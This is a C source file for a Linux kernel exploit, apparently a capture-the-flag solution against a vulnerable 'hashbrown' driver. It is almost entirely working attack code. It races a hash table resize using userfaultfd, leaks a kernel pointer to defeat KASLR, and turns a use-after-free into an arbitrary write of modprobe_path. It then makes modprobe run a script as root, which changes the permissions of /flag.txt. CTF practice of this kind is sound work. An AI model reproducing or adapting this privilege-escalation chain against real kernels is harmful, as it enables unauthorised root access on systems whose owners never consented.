#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <poll.h>
#include <assert.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>

#define ADD_KEY 0x1337
#define DELETE_KEY 0x1338
#define UPDATE_VALUE 0x1339
#define DELETE_VALUE 0x133a
#define GET_VALUE 0x133b

#define UFFDIO_API 0xc018aa3f
#define UFFDIO_REGISTER 0xc020aa00
#define UFFDIO_UNREGISTER 0x8010aa01
#define UFFDIO_COPY 0xc028aa03
#define UFFDIO_ZEROPAGE 0xc020aa04
#define UFFDIO_WAKE 0x8010aa02

#define RESIZE_THRESHOLD 12

static uint64_t race_page;
static int fd;
static pthread_t t;
void (*race_function)(void);

typedef struct
{
    uint32_t key;
    uint32_t size;
    char *src;
    char *dst;
}request_t;

struct hash_entry
{
    uint32_t key;
    uint32_t size;
    char *value;
    struct hash_entry *next;
};
typedef struct hash_entry hash_entry;

static void add_key(int fd, uint32_t key, char* src, size_t len) {
    request_t req;

    req.key = key;
    req.src = src;
    req.size = (uint32_t*)len;

    if (ioctl(fd, ADD_KEY, &req) == -1) {
        perror("ioctl");
    }
}

static void get_value(int fd, uint32_t key, char* dst, size_t len) {
    request_t req;

    req.key = key;
    req.dst = dst;
    req.size = (uint32_t*)len;

    if (ioctl(fd, GET_VALUE, &req) == -1) {
        perror("ioctl");
    }
}

static void update_value(int fd, uint32_t key, char* src, size_t len) {
    request_t req;

    req.key = key;
    req.src = src;
    req.size = (uint32_t*)len;

    if (ioctl(fd, UPDATE_VALUE, &req) == -1) {
        perror("ioctl");
    }
}

static void delete_key(int fd, uint32_t key) {
    request_t req;

    req.key = key;

    if (ioctl(fd, DELETE_KEY, &req) == -1) {
        perror("ioctl");
    }
}

static void delete_value(int fd, uint32_t key) {
    request_t req;

    req.key = key;

    if (ioctl(fd, DELETE_VALUE, &req) == -1) {
        perror("ioctl");
    }
}

void leak_setup()
{
    int shmid; // shm_file_data (kmalloc-32) leak for kernel data leak to rebase kernel with fg kaslr
    char *shmaddr;

    delete_value(fd, 0);

    if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1)
    {
        perror("shmget error");
        exit(-1);
    }
    shmaddr = shmat(shmid, NULL, 0);
    if (shmaddr == (void*)-1)
    {
        perror("shmat error");
        exit(-1);
    }
    return;
}

void uaf_setup()
{
    delete_value(fd, 0);
}

static void *racer(void *arg)
{
    struct uffd_msg uf_msg;
    struct uffdio_copy uf_copy;
    struct uffdio_range uf_range;
    long uffd = (long)arg;
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    uf_range.start = race_page;
    uf_range.len = 0x1000;

    while(poll(&pollfd, 1, -1) > 0)
    {
        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
        {
            perror("polling error");
            exit(-1);
        }
        if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
        {
            perror("error reading event");
            exit(-1);
        }
        if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror("unexpected result from event");
            exit(-1);
        }

        race_function();

        char uf_buffer[0x1000];
        uf_copy.src = (unsigned long)uf_buffer;
        uf_copy.dst = race_page;
        uf_copy.len = 0x1000;
        uf_copy.mode = 0;
        uf_copy.copy = 0;
        if(ioctl(uffd, UFFDIO_COPY, (unsigned long)&uf_copy) == -1)
        {
            perror("uffdio_copy error");
            exit(-1);
        }
        if (ioctl(uffd, UFFDIO_UNREGISTER, (unsigned long)&uf_range) == -1)
        {
            perror("error unregistering page for userfaultfd");
        }
        if (munmap((void *)race_page, 0x1000) == -1)
        {
            perror("error on munmapping race page");
        }
        return 0;
    }
    return 0;
}

static int userfaultfd(int flags)
{
    return syscall(__NR_userfaultfd, flags);
}

static void register_userfault()
{
    long fd;
    int ret;
    void* addr;
    struct uffdio_api api;
    struct uffdio_register reg;

    fd = userfaultfd(O_NONBLOCK | O_CLOEXEC);

    if (fd < 0) {
        perror("userfaultfd");
        exit(EXIT_FAILURE);
    }

    api.api = UFFD_API;
    api.features = 0;

    if (ioctl(fd, UFFDIO_API, &api) == -1) {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    addr = mmap((void*)race_page, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE |
                MAP_ANONYMOUS | MAP_FIXED, 0, 0);

    if (addr != race_page) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    reg.range.start = race_page;
    reg.range.len = 0x1000;
    reg.mode = UFFDIO_REGISTER_MODE_MISSING;

    ret = ioctl(fd, UFFDIO_REGISTER, &reg);

    if (ret < 0) {
        perror("ioctl register memory range");
    }

    ret = pthread_create(&t, NULL, racer, (void*)fd);

    if (ret < 0) {
        perror("pthread_create");
    }
}

static void print_hex8(uint8_t* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
    }

    printf("\n");
}

void modprobe_hax()
{
    char filename[65];
    memset(filename, 0, sizeof(filename));
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/roooot");
    system("chmod +x /home/ctf/roooot");
    system("echo -ne '#!/bin/sh\nchmod 777 /flag.txt' > /home/ctf/w\n");
    system("chmod +x /home/ctf/w");
    system("/home/ctf/roooot");
    return;
}

int main(void) {

    fd = open("/dev/hashbrown", O_RDWR);

    if (fd < 0) {
        perror("open");
    }

    uint8_t buf[0x20];

    for (int i = 0; i < RESIZE_THRESHOLD; i++) {
        add_key(fd, i, buf, sizeof(buf));
    }

    race_page = 0xc0c000;

    race_function = &leak_setup;

    puts("Register userfault");
    register_userfault();

    puts("Trigger fault");
    add_key(fd, RESIZE_THRESHOLD, race_page, sizeof(buf));

    puts("Wait for racer");
    pthread_join(t, NULL);

    puts("Get leaks");
    get_value(fd, 0, &buf, sizeof(buf));

    print_hex8(buf, sizeof(buf));

    const uint64_t kernel_base = ((uint64_t*)buf)[1] - 0xb0dca0;
    const uint64_t modprobe_path = kernel_base + 0xa46fe0;

    printf("Kernel base: %p \n", kernel_base);
    printf("Modprobe_path %p \n", modprobe_path);

    puts("Phase 1 done. Starting phase 2");

    // cleanup
    for (int i = 0; i <= RESIZE_THRESHOLD; i++) {
        delete_key(fd, i);
    }

    // setup for a second resize
    for (int i = 0; i < RESIZE_THRESHOLD * 2; i++) {
        add_key(fd, i, buf, sizeof(buf));
    }

    race_function = &uaf_setup;

    puts("Register userfault");
    register_userfault();

    puts("Trigger fault");
    add_key(fd, RESIZE_THRESHOLD * 2, race_page, sizeof(buf));

    puts("Wait for racer");
    pthread_join(t, NULL);

    uint8_t buf2[0x40];

    // allocate a bunch of keys in order to find double freed value
    for (int i = RESIZE_THRESHOLD * 2 + 1; i < 0x400; i++) {
        add_key(fd, i, buf2, sizeof(buf2));
    }

    memset(buf, 0, sizeof(buf));
    get_value(fd, 0, buf, sizeof(buf));

    hash_entry* p_entry = (hash_entry*)&buf;

    // test if uafed entry was used as a new hash_entry
    assert(p_entry->value != 0);

    printf("Uafed key: %d \n", p_entry->key);

    hash_entry evil;
    memmove(&evil, buf, sizeof(evil));

    // change uafed value ptr to modprobe_path
    evil.value = modprobe_path;

    update_value(fd, 0, (char*)&evil, sizeof(evil));

    memset(buf2, 0, sizeof(buf2));
    strcpy(buf2, "/home/ctf/w");

    // overwrite modprobe_path
    update_value(fd, evil.key, buf2, sizeof(buf2));

    puts("Triggering modprobe");
    modprobe_hax();

    puts("Done");

    return 0;
}

// mknod -m 666 /dev/kconcat c 337 0
